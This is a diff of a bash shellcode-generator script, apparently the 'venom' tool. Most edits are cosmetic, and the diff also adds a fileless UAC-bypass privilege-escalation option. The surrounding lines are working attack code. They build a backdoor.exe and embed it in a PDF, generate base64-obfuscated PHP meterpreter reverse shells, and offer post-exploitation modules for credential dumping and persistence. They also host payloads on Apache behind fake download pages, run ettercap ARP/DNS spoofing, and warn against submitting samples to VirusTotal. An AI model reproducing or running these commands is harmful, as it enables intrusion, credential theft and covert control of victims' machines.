@@ -2749,22 +2864,22 @@ sleep 2
 
 # EDITING/BACKUP FILES NEEDED
 echo ""
-echo "[☠ ] editing/backup files..."
+echo "[☠] editing/backup files..."
 sleep 2
 
    # check if chars.raw as generated
    if [ -e $Ch4Rs ]; then
-      echo "[☠ ] chars.raw -> found!"
+      echo "[☠] chars.raw -> found!"
       sleep 2
  
    else
 
-      echo "[☠ ] chars.raw -> not found!"
+      echo "[☠] chars.raw -> not found!"
       exit
       fi
 
 
-echo "[☠ ] Building template -> template.c!"
+echo "[☠] Building template -> template.c!"
 sleep 2
 # build template file in C language
 # reproduction of venom option 6 payload
@@ -2787,7 +2902,7 @@ sed -i "s|InJ3C|$str0|" $IPATH/output/template.c
 
 # compile template.c into one stand-alone-executable file using mingw32
 # template.c (C code to be compiled) -o (save output name)
-echo "[☠ ] Compiling template.c -> backdoor.exe!"
+echo "[☠] Compiling template.c -> backdoor.exe!"
 sleep 2
 i586-mingw32msvc-gcc $IPATH/output/template.c -o $IPATH/output/backdoor.exe -mwindows
 strip --strip-debug $IPATH/output/backdoor.exe
@@ -2796,7 +2911,7 @@ strip --strip-debug $IPATH/output/backdoor.exe
 
 # if you wish to inject your build in another pdf file then change: ( INFILENAME ) switch by the full path to your pdf file
 # using msfconsole to embedded the backdoor.exe into one pdf file (remmenber to exit msfconsole: exit -y)
-xterm -T "☠ EVIL PDF BUILDER ☠" -geometry 110x23 -e "msfconsole -x 'use windows/fileformat/adobe_pdf_embedded_exe; set EXE::Custom $IPATH/output/backdoor.exe; set FILENAME $N4m.pdf; set INFILENAME $Myd0; exploit; exit -y'" > /dev/null 2>&1
+xterm -T " EVIL PDF BUILDER " -geometry 110x23 -e "msfconsole -x 'use windows/fileformat/adobe_pdf_embedded_exe; set EXE::Custom $IPATH/output/backdoor.exe; set FILENAME $N4m.pdf; set INFILENAME $Myd0; exploit; exit -y'" > /dev/null 2>&1
 
 
 # move files from metasploit to local directory
@@ -2808,9 +2923,9 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
 
    if [ "$serv" = "multi-handler (default)" ]; then
       # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
-      echo "[☠ ] Start a multi-handler..."
-      echo "[☠ ] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
-      echo "[☯ ] Please dont test samples on virus total..."
+      echo "[☠] Start a multi-handler..."
+      echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
+      echo "[☯] Please dont test samples on virus total..."
 xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; exploit'"
       sleep 2
 
@@ -2818,7 +2933,7 @@ xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use 
    else
 
 
-P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "fast_migrate.rc" FALSE "cred_dump.rc" FALSE "gather.rc" FALSE "persistence.rc" --width 350 --height 260) > /dev/null 2>&1
+P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "fast_migrate.rc" FALSE "cred_dump.rc" FALSE "gather.rc" FALSE "persistence.rc" FALSE "privilege_escalation.rc" FALSE "post_multi.rc" --width 350 --height 300) > /dev/null 2>&1
 
   if [ "$P0" = "persistence.rc" ]; then
   M1P=$(zenity --entry --title "☠ AUTO-START PAYLOAD ☠" --text "\nAuto-start payload Every specified hours 1-23\n\nexample: 23\nwill auto-start $N4m.pdf on target every 23 hours" --width 300) > /dev/null 2>&1
@@ -2839,6 +2954,22 @@ P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploita
     mv $lhost.rc $IPATH/output/$lhost.rc
     cd $IPATH
 
+    elif [ "$P0" = "privilege_escalation.rc" ]; then
+      cd $IPATH/aux
+      # backup files needed
+      cp privilege_escalation.rc privilege_escalation[bak].rc
+      cp enigma_fileless_uac_bypass.rb enigma_fileless_uac_bypass[bak].rb
+      # Build resource files needed
+      sed -i "s|N4m|$N4m.pdf|g" privilege_escalation.rc
+      sed -i "s|IPATH|$IPATH|g" privilege_escalation.rc
+      sed -i "s|N4m|$N4m.pdf|g" enigma_fileless_uac_bypass.rb
+      # reload metasploit database
+      echo "[☠] copy post-module to msf db!"
+      cp enigma_fileless_uac_bypass.rb $mSf/enigma_fileless_uac_bypass.rb
+      echo "[☠] reloading -> Metasploit database!"
+      xterm -T " reloading -> Metasploit database " -geometry 110x23 -e "sudo msfconsole -x 'reload_all; exit -y'" > /dev/null 2>&1
+      cd $IPATH
+
   else
 
     echo "do nothing" > /dev/null 2>&1
@@ -2852,7 +2983,7 @@ fi
       cp copy.html $ApAcHe/index.html > /dev/null 2>&1
       cd $IPATH/output
       cp $N4m.pdf $ApAcHe/$N4m.pdf > /dev/null 2>&1
-      echo "[☠ ] loading -> Apache2Server!"
+      echo "[☠] loading -> Apache2Server!"
       echo "---"
       echo "- SEND THE URL GENERATED TO TARGET HOST"
 
@@ -2864,9 +2995,9 @@ fi
         echo "- POST EXPLOIT : $P0"
         echo "---"
         # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
-        echo "[☠ ] Start a multi-handler..."
-        echo "[☠ ] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
-        echo "[☯ ] Please dont test samples on virus total..."
+        echo "[☠] Start a multi-handler..."
+        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
+        echo "[☯] Please dont test samples on virus total..."
         xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T "☠ DNS_SPOOF [redirecting traffic] ☠" -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
 
         else
@@ -2875,9 +3006,9 @@ fi
         echo "- POST EXPLOIT : $P0"
         echo "---"
         # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
-        echo "[☠ ] Start a multi-handler..."
-        echo "[☠ ] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
-        echo "[☯ ] Please dont test samples on virus total..."
+        echo "[☠] Start a multi-handler..."
+        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
+        echo "[☯] Please dont test samples on virus total..."
         xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
 
         fi
@@ -2896,11 +3027,11 @@ else
 # config settings in PDF_encoder.py script
 ec=`echo ~`
 # get user input to build shellcode
-echo "[☠ ] Enter shellcode settings!"
+echo "[☠] Enter shellcode settings!"
 lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 330) > /dev/null 2>&1
 lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 330) > /dev/null 2>&1
 N4m=$(zenity --entry --title "☠ ENTER PDF OUTPUT NAME ☠" --text "Enter pdf output name\nexample: shellcode" --width 300) > /dev/null 2>&1
-echo "[☠ ] editing/backup files..."
+echo "[☠] editing/backup files..."
 sleep 2
 cd $IPATH/templates/evil_pdf
 cp PDF_encoder.py PDF_encoder[bak].py
@@ -2912,12 +3043,12 @@ sed -i "s|lP0Rt|$lport|" PDF_encoder.py
 
 
 # runing evil-pdf-builder python script
-xterm -T "☠ EVIL PDF BUILDER ☠" -geometry 110x23 -e "python PDF_encoder.py" > /dev/null 2>&1
+xterm -T " EVIL PDF BUILDER " -geometry 110x23 -e "python PDF_encoder.py" > /dev/null 2>&1
 # moving files
 mv PDF_encoder[bak].py PDF_encoder.py
 mv ~/backdoor.exe $IPATH/output/backdoor.exe
 mv ~/backdoor.pdf $IPATH/output/$N4m.pdf
-echo "[☠ ] files generated into output folder..."
+echo "[☠] files generated into output folder..."
 cd $IPATH
 
 
@@ -2926,9 +3057,9 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
 
    if [ "$serv" = "multi-handler (default)" ]; then
       # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
-      echo "[☠ ] Start a multi-handler..."
-      echo "[☠ ] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
-      echo "[☯ ] Please dont test samples on virus total..."
+      echo "[☠] Start a multi-handler..."
+      echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
+      echo "[☯] Please dont test samples on virus total..."
 xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD windows/meterpreter/reverse_tcp; exploit'"
       sleep 2
 
@@ -2936,7 +3067,7 @@ xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use 
    else
 
 
-P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "fast_migrate.rc" FALSE "cred_dump.rc" FALSE "gather.rc" FALSE "persistence.rc" --width 350 --height 260) > /dev/null 2>&1
+P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploitation module to run" --radiolist --column "Pick" --column "Option" TRUE "sysinfo.rc" FALSE "fast_migrate.rc" FALSE "cred_dump.rc" FALSE "gather.rc" FALSE "persistence.rc" FALSE "privilege_escalation.rc" FALSE "post_multi.rc" --width 350 --height 300) > /dev/null 2>&1
 
   if [ "$P0" = "persistence.rc" ]; then
   M1P=$(zenity --entry --title "☠ AUTO-START PAYLOAD ☠" --text "\nAuto-start payload Every specified hours 1-23\n\nexample: 23\nwill auto-start $N4m.pdf on target every 23 hours" --width 300) > /dev/null 2>&1
@@ -2957,6 +3088,22 @@ P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploita
     mv $lhost.rc $IPATH/output/$lhost.rc
     cd $IPATH
 
+    elif [ "$P0" = "privilege_escalation.rc" ]; then
+      cd $IPATH/aux
+      # backup files needed
+      cp privilege_escalation.rc privilege_escalation[bak].rc
+      cp enigma_fileless_uac_bypass.rb enigma_fileless_uac_bypass[bak].rb
+      # Build resource files needed
+      sed -i "s|N4m|$N4m.pdf|g" privilege_escalation.rc
+      sed -i "s|IPATH|$IPATH|g" privilege_escalation.rc
+      sed -i "s|N4m|$N4m.pdf|g" enigma_fileless_uac_bypass.rb
+      # reload metasploit database
+      echo "[☠] copy post-module to msf db!"
+      cp enigma_fileless_uac_bypass.rb $mSf/enigma_fileless_uac_bypass.rb
+      echo "[☠] reloading -> Metasploit database!"
+      xterm -T " reloading -> Metasploit database " -geometry 110x23 -e "sudo msfconsole -x 'reload_all; exit -y'" > /dev/null 2>&1
+      cd $IPATH
+
   else
 
     echo "do nothing" > /dev/null 2>&1
@@ -2971,7 +3118,7 @@ fi
       cp copy.html $ApAcHe/index.html > /dev/null 2>&1
       cd $IPATH/output
       cp $N4m.pdf $ApAcHe/$N4m.pdf > /dev/null 2>&1
-      echo "[☠ ] loading -> Apache2Server!"
+      echo "[☠] loading -> Apache2Server!"
       echo "---"
       echo "- SEND THE URL GENERATED TO TARGET HOST"
 
@@ -2983,9 +3130,9 @@ fi
         echo "- POST EXPLOIT : $P0"
         echo "---"
         # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
-        echo "[☠ ] Start a multi-handler..."
-        echo "[☠ ] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
-        echo "[☯ ] Please dont test samples on virus total..."
+        echo "[☠] Start a multi-handler..."
+        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
+        echo "[☯] Please dont test samples on virus total..."
         xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD windows/meterpreter/reverse_tcp; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T "☠ DNS_SPOOF [redirecting traffic] ☠" -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
 
         else
@@ -2994,9 +3141,9 @@ fi
         echo "- POST EXPLOIT : $P0"
         echo "---"
         # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
-        echo "[☠ ] Start a multi-handler..."
-        echo "[☠ ] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
-        echo "[☯ ] Please dont test samples on virus total..."
+        echo "[☠] Start a multi-handler..."
+        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
+        echo "[☯] Please dont test samples on virus total..."
         xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD windows/meterpreter/reverse_tcp; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
 
         fi
@@ -3009,10 +3156,12 @@ fi
 
 sleep 2
 # CLEANING EVERYTHING UP
-echo "[☠ ] Cleanning temp generated files..."
+echo "[☠] Cleanning temp generated files..."
 mv $IPATH/templates/exec[bak].py $InJEc2 > /dev/null 2>&1
 mv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1
 mv $IPATH/templates/evil_pdf/PDF-encoder[bak].py PDF-encoder.py > /dev/null 2>&1
+mv $IPATH/aux/privilege_escalation[bak].rc $IPATH/aux/privilege_escalation.rc > /dev/null 2>&1
+mv $IPATH/aux/enigma_fileless_uac_bypass[bak].rb $IPATH/aux/enigma_fileless_uac_bypass.rb > /dev/null 2>&1
 mv $IPATH/aux/persistence[bak].rc $IPATH/aux/persistence.rc > /dev/null 2>&1
 rm $IPATH/templates/evil_pdf/template.raw > /dev/null 2>&1
 rm $IPATH/templates/evil_pdf/template.c > /dev/null 2>&1
@@ -3043,7 +3192,7 @@ cd $IPATH/
 # ------------------------------------------------------
 sh_shellcode16 () {
 # get user input to build shellcode
-echo "[☠ ] Enter shellcode settings!"
+echo "[☠] Enter shellcode settings!"
 lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 330) > /dev/null 2>&1
 lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 330) > /dev/null 2>&1
 N4m=$(zenity --title="☠ PHP NAME ☠" --text "example: shellcode" --entry --width 330) > /dev/null 2>&1
@@ -3054,7 +3203,7 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nWARNING: th
 
 
 if [ "$serv" = "php/meterpreter (default)" ]; then
-echo "[☠ ] Building shellcode -> php format ..."
+echo "[☠] Building shellcode -> php format ..."
 # display final settings to user
 cat << !
 
@@ -3071,12 +3220,12 @@ cat << !
 xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p php/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -f raw > $IPATH/output/$N4m.php"
 
 echo ""
-echo "[☠ ] building raw shellcode..."
+echo "[☠] building raw shellcode..."
 sleep 2
-echo "[☠ ] Injecting shellcode -> $N4m.php!"
+echo "[☠] Injecting shellcode -> $N4m.php!"
 sleep 2
 # delete bad chars in php payload
-echo "[☠ ] deleting webshell.php junk..."
+echo "[☠] deleting webshell.php junk..."
 sleep 2
 cd $IPATH/output
 sed "s/\///" $N4m.php > web2.php
@@ -3091,9 +3240,9 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "WEBSHELL STOR
 
    if [ "$serv" = "multi-handler (default)" ]; then
      # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
-     echo "[☠ ] Start a multi-handler..."
-     echo "[☠ ] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
-     echo "[☯ ] Please dont test samples on virus total..."
+     echo "[☠] Start a multi-handler..."
+     echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
+     echo "[☯] Please dont test samples on virus total..."
      xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD php/meterpreter/reverse_tcp; exploit'"
 
    else
@@ -3106,7 +3255,7 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "WEBSHELL STOR
       # copy from output
       cd $IPATH/output
       cp $N4m.php $ApAcHe/$N4m.php > /dev/null 2>&1
-      echo "[☠ ] loading -> Apache2Server!"
+      echo "[☠] loading -> Apache2Server!"
       echo "---"
       echo "- SEND THE URL GENERATED TO TARGET HOST"
 
@@ -3117,9 +3266,9 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "WEBSHELL STOR
         echo "- ATTACK VECTOR: http://mega-upload.com"
         echo "---"
         # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
-        echo "[☠ ] Start a multi-handler..."
-        echo "[☠ ] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
-        echo "[☯ ] Please dont test samples on virus total..."
+        echo "[☠] Start a multi-handler..."
+        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
+        echo "[☯] Please dont test samples on virus total..."
         xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD php/meterpreter/reverse_tcp; exploit'" & xterm -T "☠ DNS_SPOOF [redirecting traffic] ☠" -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
 
         else
@@ -3127,9 +3276,9 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "WEBSHELL STOR
         echo "- ATTACK VECTOR: http://$lhost"
         echo "---"
         # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
-        echo "[☠ ] Start a multi-handler..."
-        echo "[☠ ] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
-        echo "[☯ ] Please dont test samples on virus total..."
+        echo "[☠] Start a multi-handler..."
+        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
+        echo "[☯] Please dont test samples on virus total..."
         xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD php/meterpreter/reverse_tcp; exploit'"
 
         fi
@@ -3137,7 +3286,7 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "WEBSHELL STOR
 
 
 # CLEANING EVERYTHING UP
-echo "[☠ ] Cleanning temp generated files..."
+echo "[☠] Cleanning temp generated files..."
 sleep 2
 mv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1
 rm $IPATH/output/chars.raw > /dev/null 2>&1
@@ -3154,7 +3303,7 @@ elif [ "$serv" = "php/meterpreter (base64)" ]; then
 # ----------------------
 # BASE64 ENCODED PAYLOAD
 # ----------------------
-echo "[☠ ] Building shellcode -> php format ..."
+echo "[☠] Building shellcode -> php format ..."
 # display final settings to user
 cat << !
 
@@ -3172,7 +3321,7 @@ xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p php/meterprete
 
 st0r3=`cat $IPATH/output/chars.raw`
 echo ""
-echo "[☠ ] obfuscating -> base64 encoded!"
+echo "[☠] obfuscating -> base64 encoded!"
 sleep 2
 echo $st0r3
 echo ""
@@ -3180,37 +3329,37 @@ echo ""
 
 # EDITING/BACKUP FILES NEEDED
 echo ""
-echo "[☠ ] editing/backup files..."
+echo "[☠] editing/backup files..."
 cp $InJEc11 $IPATH/templates/exec[bak].php
 sleep 2
 
 
    # check if exec.ps1 exists
    if [ -e $InJEc11 ]; then
-      echo "[☠ ] exec.php -> found!"
+      echo "[☠] exec.php -> found!"
       sleep 2
  
    else
 
-      echo "[☠ ] exec.php -> not found!"
+      echo "[☠] exec.php -> not found!"
       exit
       fi
 
    # check if chars.raw as generated
    if [ -e $Ch4Rs ]; then
-      echo "[☠ ] chars.raw -> found!"
+      echo "[☠] chars.raw -> found!"
       sleep 2
  
    else
 
-      echo "[☠ ] chars.raw -> not found!"
+      echo "[☠] chars.raw -> not found!"
       exit
       fi
 
 
 # injecting shellcode into name.php
 cd $IPATH/templates/
-echo "[☠ ] Injecting shellcode -> $N4m.php!"
+echo "[☠] Injecting shellcode -> $N4m.php!"
 sleep 2
 sed "s|InJ3C|$st0r3|g" exec.php > obfuscated.raw
 mv obfuscated.raw $IPATH/output/$N4m.php
@@ -3223,9 +3372,9 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "WEBSHELL STOR
 
    if [ "$serv" = "multi-handler (default)" ]; then
      # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
-     echo "[☠ ] Start a multi-handler..."
-     echo "[☠ ] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
-     echo "[☯ ] Please dont test samples on virus total..."
+     echo "[☠] Start a multi-handler..."
+     echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
+     echo "[☯] Please dont test samples on virus total..."
      xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD php/meterpreter/reverse_tcp; exploit'"
 
 
@@ -3240,7 +3389,7 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "WEBSHELL STOR
       # copy from output
       cd $IPATH/output
       cp $N4m.php $ApAcHe/$N4m.php > /dev/null 2>&1
-      echo "[☠ ] loading -> Apache2Server!"
+      echo "[☠] loading -> Apache2Server!"
       echo "---"
       echo "- SEND THE URL GENERATED TO TARGET HOST"
 
@@ -3251,9 +3400,9 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "WEBSHELL STOR
         echo "- ATTACK VECTOR: http://mega-upload.com"
         echo "---"
         # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
-        echo "[☠ ] Start a multi-handler..."
-        echo "[☠ ] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
-        echo "[☯ ] Please dont test samples on virus total..."
+        echo "[☠] Start a multi-handler..."
+        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
+        echo "[☯] Please dont test samples on virus total..."
         xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD php/meterpreter/reverse_tcp; exploit'" & xterm -T "☠ DNS_SPOOF [redirecting traffic] ☠" -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
 
         else
@@ -3261,9 +3410,9 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "WEBSHELL STOR
         echo "- ATTACK VECTOR: http://$lhost"
         echo "---"
         # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
-        echo "[☠ ] Start a multi-handler..."
-        echo "[☠ ] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
-        echo "[☯ ] Please dont test samples on virus total..."
+        echo "[☠] Start a multi-handler..."
+        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
+        echo "[☯] Please dont test samples on virus total..."
         xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD php/meterpreter/reverse_tcp; exploit'"
 
         fi
@@ -3278,7 +3427,7 @@ else
 # ------------------------------
 # BASE64 MY UNIX APACHE2 EXPLOIT
 # ------------------------------
-echo "[☠ ] Building shellcode -> php format ..."
+echo "[☠] Building shellcode -> php format ..."
 # display final settings to user
 cat << !
 
@@ -3296,7 +3445,7 @@ xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p php/meterprete
 
 st0r3=`cat $IPATH/output/chars.raw`
 echo ""
-echo "[☠ ] obfuscating -> base64 encoded!"
+echo "[☠] obfuscating -> base64 encoded!"
 sleep 2
 echo $st0r3
 echo ""
@@ -3304,37 +3453,37 @@ echo ""
 
 # EDITING/BACKUP FILES NEEDED
 echo ""
-echo "[☠ ] editing/backup files..."
+echo "[☠] editing/backup files..."
 cp $InJEc11 $IPATH/templates/exec[bak].php
 sleep 2
 
 
    # check if exec.ps1 exists
    if [ -e $InJEc11 ]; then
-      echo "[☠ ] exec.php  -> found!"
+      echo "[☠] exec.php  -> found!"
       sleep 2
  
    else
 
-      echo "[☠ ] exec.php -> not found!"
+      echo "[☠] exec.php -> not found!"
       exit
       fi
 
    # check if chars.raw as generated
    if [ -e $Ch4Rs ]; then
-      echo "[☠ ] chars.raw -> found!"
+      echo "[☠] chars.raw -> found!"
       sleep 2
  
    else
 
-      echo "[☠ ] chars.raw -> not found!"
+      echo "[☠] chars.raw -> not found!"
       exit
       fi
 
 
 cd $IPATH/templates/
 # injecting settings into trigger.sh
-echo "[☠ ] building  -> trigger.sh!"
+echo "[☠] building  -> trigger.sh!"
 sleep 2
 sed "s|InJ3C|$N4m.php|g" trigger.sh > trigger.raw
 sed "s|Lh0St|$lhost|g" trigger.raw > trigger2.raw
@@ -3344,7 +3493,7 @@ rm trigger.raw > /dev/null 2>&1
 
 
 # injecting shellcode into name.php
-echo "[☠ ] Injecting shellcode -> $N4m.php!"
+echo "[☠] Injecting shellcode -> $N4m.php!"
 sleep 2
 sed "s|InJ3C|$st0r3|g" exec.php > obfuscated.raw
 mv obfuscated.raw $IPATH/output/$N4m.php
@@ -3360,7 +3509,7 @@ mv copy.html $ApAcHe/index.html > /dev/null 2>&1
 cd $IPATH/output
 cp $N4m.php $ApAcHe/$N4m.php > /dev/null 2>&1
 cp trigger.sh $ApAcHe/trigger.sh > /dev/null 2>&1
-echo "[☠ ] loading -> Apache2Server!"
+echo "[☠] loading -> Apache2Server!"
 echo "---"
 echo "- SEND THE URL GENERATED TO TARGET HOST"
 
@@ -3372,9 +3521,9 @@ echo "- SEND THE URL GENERATED TO TARGET HOST"
         echo "- ATTACK VECTOR: http://mega-upload.com"
         echo "---"
         # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
-        echo "[☠ ] Start a multi-handler..."
-        echo "[☠ ] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
-        echo "[☯ ] Please dont test samples on virus total..."
+        echo "[☠] Start a multi-handler..."
+        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
+        echo "[☯] Please dont test samples on virus total..."
         xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD php/meterpreter/reverse_tcp; exploit'" & xterm -T "☠ DNS_SPOOF [redirecting traffic] ☠" -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
 
         else
@@ -3382,16 +3531,16 @@ echo "- SEND THE URL GENERATED TO TARGET HOST"
         echo "- ATTACK VECTOR: http://$lhost"
         echo "---"
         # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
-        echo "[☠ ] Start a multi-handler..."
-        echo "[☠ ] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
-        echo "[☯ ] Please dont test samples on virus total..."
+        echo "[☠] Start a multi-handler..."
+        echo "[☠] Press [ctrl+c] or [exit] to 'exit' meterpreter shell"
+        echo "[☯] Please dont test samples on virus total..."
         xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD php/meterpreter/reverse_tcp; exploit'"
 
         fi
 
 
 # CLEANING EVERYTHING UP
-echo "[☠ ] Cleanning temp generated files..."
+echo "[☠] Cleanning temp generated files..."
 sleep 2
 mv $IPATH/templates/phishing/mega[bak].html $InJEc12 > /dev/null 2>&1
 mv $IPATH/templates/exec[bak].php $InJEc11 > /dev/null 2>&1
@@ -3418,12 +3567,12 @@ fi
 # -----------------------------------------------------------------
 sh_shellcode17 () {
 # get user input to build shellcode
-echo "[☠ ] Enter shellcode settings!"
+echo "[☠] Enter shellcode settings!"
 lhost=$(zenity --title="☠ Enter LHOST ☠" --text "example: $IP" --entry --width 330) > /dev/null 2>&1
 lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --width 330) > /dev/null 2>&1
 N4m=$(zenity --entry --title "☠ SHELLCODE NAME ☠" --text "Enter shellcode output name\nexample: shellcode" --width 300) > /dev/null 2>&1
 
-echo "[☠ ] Building shellcode -> python language..."
+echo "[☠] Building shellcode -> python language..."
 sleep 2
 # display final settings to user
 cat << !
@@ -3445,14 +3594,14 @@ disp=`cat $IPATH/output/chars.raw | awk {'print $3'} | cut -d '(' -f3 | cut -d '
 # display shellcode
 # cat $IPATH/output/chars.raw
 echo ""
-echo "[☠ ] obfuscating -> base64 encoded!"
+echo "[☠] obfuscating -> base64 encoded!"
 sleep 2
 echo $disp
 echo ""
 
 # EDITING/BACKUP FILES NEEDED
 echo ""
-echo "[☠ ] editing/backup files..."
+echo "[☠] editing/backup files..."
 cp $InJEc9 $IPATH/templates/exec0[bak].py
 cp $InJEc7 $IPATH/templates/hta_attack/index[bak].html
 sleep 2
